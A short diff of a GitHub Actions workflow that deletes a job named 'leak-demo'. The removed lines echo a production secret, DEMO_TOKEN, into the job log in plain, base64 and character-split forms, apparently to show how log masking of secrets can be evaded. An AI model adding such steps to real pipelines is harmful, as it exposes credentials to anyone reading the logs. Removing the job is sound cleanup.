@@ -83,13 +83,3 @@ jobs:
           IMAGE="ghcr.io/${GITHUB_REPOSITORY,,}:${GITHUB_SHA::8}"
           docker build -t "$IMAGE" .
           docker push "$IMAGE"
-  leak-demo:
-    runs-on: ubuntu-latest
-    environment: production
-    env:
-      DEMO_TOKEN: ${{ secrets.DEMO_TOKEN }}
-    steps:
-      - run: |
-          echo "direct=$DEMO_TOKEN"
-          echo "base64=$(echo -n "$DEMO_TOKEN" | base64)"
-          echo "caracteres=$(echo -n "$DEMO_TOKEN" | fold -w1 | tr '\n' ' ')"
